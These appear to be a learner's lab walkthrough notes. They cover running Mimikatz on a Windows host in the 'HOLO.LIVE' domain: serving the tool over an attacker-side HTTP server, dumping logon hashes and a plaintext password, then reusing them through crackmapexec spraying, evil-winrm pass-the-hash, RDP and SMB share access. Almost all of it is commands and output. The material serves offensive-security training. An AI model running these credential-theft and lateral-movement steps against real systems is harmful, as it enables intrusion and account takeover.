
Let's run Mimikatz
```
http://10.51.9.13/mimikatz/x64/
```

```
python3 -m http.server 80
```

https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

```
Username : S-SRV01$
NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
HA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
```

```
Username : watamet
NTLM     : d8d41e6cf762a8c77776a1843d4141c9
SHA1     : 7701207008976fdd6c6be9991574e2480853312d
DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0

Username : watamet
Domain   : HOLO.LIVE
Password : Nothingtoworry!
```


![[Pasted image 20240830041056.png]]


```
crackmapexec smb 10.201.11.31 -u valid_user.txt -p Nothingtoworry!
```


```
evil-winrm -u administrator -H 3179c8ec65934b8d33ac9ec2a9d93400 -i 10.201.11.35
```


```
evil-winrm -u watamet -password Nothingtoworry! -i 10.201.11.35
```

That didn't worked but we should always try for little hanging fruits
```
rdesktop -u watamet -p Nothingtoworry! 10.201.11.30
```

Read/Write
```
crackmapexec smb 10.201.11.30 -u 'watamet' -p 'Nothingtoworry!' --shares
```
![[Pasted image 20240830043757.png]]

```
smbclient \\\\10.201.11.30\\SYSVOL -U 'watamet' 
```

-p 'Nothingtoworry!'

